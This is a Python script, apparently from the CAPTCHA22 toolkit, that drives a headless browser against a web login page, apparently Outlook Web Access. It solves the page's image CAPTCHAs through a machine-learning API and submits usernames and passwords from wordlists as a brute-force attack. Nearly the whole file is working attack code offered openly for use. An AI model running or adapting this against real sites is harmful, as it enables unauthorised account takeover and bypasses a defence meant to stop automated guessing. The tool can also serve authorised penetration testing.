#!/usr/bin/python3
import argparse
import asyncio
if __name__ == "__main__":
    from captcha_cracking import Cracker
else:
    from lib.crackers.captcha_cracking import Cracker
from pyppeteer import launch
import time

class PyppeteerCracker:
    def __init__(self,args):
        self.args = args
        self.users = []
        self.passwords = []

        if self.args.usernamefile == None:
            self.args.usernamefile = str(input("Please enter the path to the usernames file:"))

        if self.args.passwordfile == None:
            self.args.passwordfile = str(input("Please enter the path to the passwords file:"))

        lines = open(self.args.usernamefile).readlines()
        for line in lines:
            self.users.append(line.replace("\n", ""))

        lines = open(self.args.passwordfile).readlines()
        for line in lines:
            self.passwords.append(line.replace("\n", ""))

        if self.args.attackingURL == None:
            self.args.attackingURL = str(input("Please enter the URL of the authentication page you want to automate:"))

        self.cracker = Cracker(args)

    async def check_on_captcha_page(self, page):
        check_for_captcha = self.args.checkcaptcha
        content = await page.evaluate('document.body.textContent', force_expr=True)
        if check_for_captcha in content:
            return True
        else:
            return False

    async def check_on_login_page(self, page):
        check_for_login = self.args.checklogin
        content = await page.evaluate('document.body.textContent', force_expr=True)
        if check_for_login in content:
            return True
        else:
            return False

    async def check_login_failed(self, page):
        check_for_login = self.args.verifylogin
        content = await page.evaluate('document.body.textContent', force_expr=True)
        if check_for_login in content:
            return True
        else:
            return False

    async def step(self):
        input("Enter to continue: ")

    async def login(self, page,username,password):
        print("Testing user: "+str(username))

        await page.click('input[name='+self.args.usernamefield+']');
        time.sleep(0.1)
        await page.keyboard.down('Control');
        time.sleep(0.1)
        await page.keyboard.press('KeyA');
        time.sleep(0.1)
        await page.keyboard.up('Control');
        time.sleep(0.1)
        await page.keyboard.press('Backspace');
        time.sleep(0.1)
        await page.type('#'+self.args.usernamefield+'', username)
        time.sleep(0.1)
        await page.type('#'+self.args.passwordfield+'', password)
        time.sleep(0.1)
        await page.keyboard.press('Enter')
        await page.waitForNavigation()

        if await self.check_login_failed(page):
            print("Login failed")
            return False
        else:
            if (await self.check_on_captcha_page(page)):
                print ("Back to captcha page")
                return False

        print("VALID LOGIN ???")
        return True

    async def flow(self, page,username,password):
        await page.goto(self.args.attackingURL)
        while (await self.check_on_captcha_page(page)):
            print("Waiting for captcha")
            img = await page.xpath('/html/body/img')
            img_source = await page.evaluate('(img) => img.src', img[0])

            # Send image to API
            captcha = self.cracker.solve_captcha_b64(img_source)

            print("Submitting captcha as: " +str(captcha))
            await page.type('#'+self.args.captchafield, captcha);
            await page.keyboard.press('Enter');
            time.sleep(0.5)

            # Wait for redirect to OWA
            await page.waitForNavigation()

            if await self.check_on_login_page(page):
                print("CAPTCHA valid")
                cracker.get_captcha_feedback(True)

                # login
                await self.login(page,username,password)
            else:
                print("Invalid CAPTCHA")
                cracker.get_captcha_feedback(False)

        print("Didn't ask for captcha")
        await self.login(page,username,password)

    async def main(self):
        browser = await launch(headless=False,args=['--no-sandbox'])#Proxy can be used to debug: ,'--proxy-server=http://127.0.0.1:8080'])
        page = await browser.newPage()
        for user,passwd in zip(self.users,self.passwords):
            await self.flow(page,user,passwd)
        await browser.close()

    def norm_main(self):
        asyncio.get_event_loop().run_until_complete(self.main())


def normal_main(args):
    puppet = PyppeteerCracker(args)
    puppet.norm_main()

    #asyncio.get_event_loop().run_until_complete(puppet.main())



if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog="pyppeteer", description=("Pyppeteer is a simulation example of what can be done using browser automation software and CAPTCHA22"))

    #Arguments
    #Server
    parser.add_argument("--serverURL", default="http://127.0.0.1", help="Specify the URL of the CAPTCHA22 API Server, default is http://127.0.0.1")
    parser.add_argument("--serverPATH", default="/captcha22/api/v1.0/", help="Specify the API Endpoint Path of the CAPTCHA22 API Server, default is /captcha22/api/v1.0/")
    parser.add_argument("--serverPORT", default="5000", help="Specify the PORT of the CAPTCHA22 API Server, default is 5000")

    #Credentials
    parser.add_argument("--username", default=None, help="Username used for connection to CAPTCHA22, default will be prompted")
    parser.add_argument("--password", default=None, help="Password used for connection to CAPTCHA22, default will be prompted")

    #Session var
    parser.add_argument("--sessiontime", default=1800, help="Specify the time that a JWT session remains active")

    #Options var
    parser.add_argument("--useHashes", default=False, help="Use hash comparisons to aid cracking process", action="store_true")
    parser.add_argument("--useFilter", default=False, help="Use image filter to aid cracking process", action="store_true")
    parser.add_argument("--useLocal", default=False, help="Use a local copy of Tensorflow model instead of CAPTCHA22", action="store_true")

    #Storage var
    parser.add_argument("--input", default="./input/", help="Specify the directory where solved CAPTCHAs are stored")
    parser.add_argument("--output", default="./output/", help="Specify the output directory where new correct and incorrect CAPTCHAs are stored")

    #Image var
    parser.add_argument("--imagetype", default="png", help="Specify the image file type, default is png")
    parser.add_argument("--filterlow", default=130, help="Grayscale lower limit for image filter, default is 130")
    parser.add_argument("--filterhigh", default=142, help="Grayscale upper limit for image filter, default is 142")
    parser.add_argument("--captchaID", default=None, help="Specify captchID from CATCHA22 API Server for the model that will be used, default will be prompted")

    #Pyppeteer var
    parser.add_argument("--checkcaptcha", default="What code is in the image?", help="Specify the phrase that Pyppeteer can search for to determine if it is on the CAPTCHA page")
    parser.add_argument("--checklogin", default="Password", help="Specify the phrase that Pyppeteer can search for to determine if it is on the Login page")
    parser.add_argument("--verifylogin", default="The user name or password you entered isn't correct. Try entering it again.", help="Specify the prhase that Pyppeteer can search for to determine if the login attempt failed")
    parser.add_argument("--usernamefield", default="username", help="Specify HTML field where the username entry is located")
    parser.add_argument("--passwordfield", default="password", help="Specify HTML field where the password entry is located")
    parser.add_argument("--captchafield", default="ans", help="Specify HTML field where the CAPTCHA answer must be submitted")
    parser.add_argument("--attackingURL", default=None, help="Specify the URL of the website that will be attacked")

    #Attacking var
    parser.add_argument("--usernamefile", default=None, help="Specify path to file containing usernames for brute force attack")
    parser.add_argument("--passwordfile", default=None, help="Specify path to file containing passwords for brute force attack")

    args = parser.parse_args()

    normal_main(args)

